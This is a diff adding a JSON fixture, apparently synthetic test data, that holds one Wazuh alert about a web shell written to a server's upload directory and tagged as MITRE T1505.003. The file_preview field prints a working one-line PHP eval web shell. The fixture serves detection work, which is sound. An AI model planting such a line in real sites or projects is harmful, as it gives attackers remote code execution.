@@ -1,0 +1,60 @@
+[
+  {
+    "id": "wazuh-webshell-written-001",
+    "source": "wazuh",
+    "timestamp": "2026-07-18T14:22:39Z",
+    "payload": {
+      "id": "wazuh-webshell-written-001",
+      "timestamp": "2026-07-18T14:22:39Z",
+      "agent": {
+        "id": "021",
+        "name": "web-prod-021",
+        "ip": "10.0.7.21",
+        "os": {
+          "name": "Rocky Linux 9.4"
+        }
+      },
+      "manager": {
+        "name": "wazuh-manager-01"
+      },
+      "rule": {
+        "id": "554",
+        "level": 12,
+        "description": "Web shell written into the document root by the web server user",
+        "groups": [
+          "ossec",
+          "syscheck",
+          "syscheck_entry_added",
+          "web",
+          "persistence"
+        ],
+        "mitre": {
+          "id": [
+            "T1505.003"
+          ],
+          "tactic": [
+            "Persistence"
+          ],
+          "technique": [
+            "Web Shell"
+          ]
+        }
+      },
+      "syscheck": {
+        "path": "/var/www/html/uploads/wp-cache-x.php",
+        "mode": "realtime",
+        "event": "added",
+        "size_after": "312",
+        "uname_after": "apache",
+        "gname_after": "apache",
+        "perm_after": "rw-r--r--",
+        "sha256_after": "fake-hash-do-not-report-webshell"
+      },
+      "data": {
+        "srcip": "10.0.7.21",
+        "file_preview": "<?php @eval($_POST['c']); ?>"
+      },
+      "full_log": "File '/var/www/html/uploads/wp-cache-x.php' added to the file system on web-prod-021, owner apache, contents begin with '<?php @eval($_POST[' "
+    }
+  }
+]
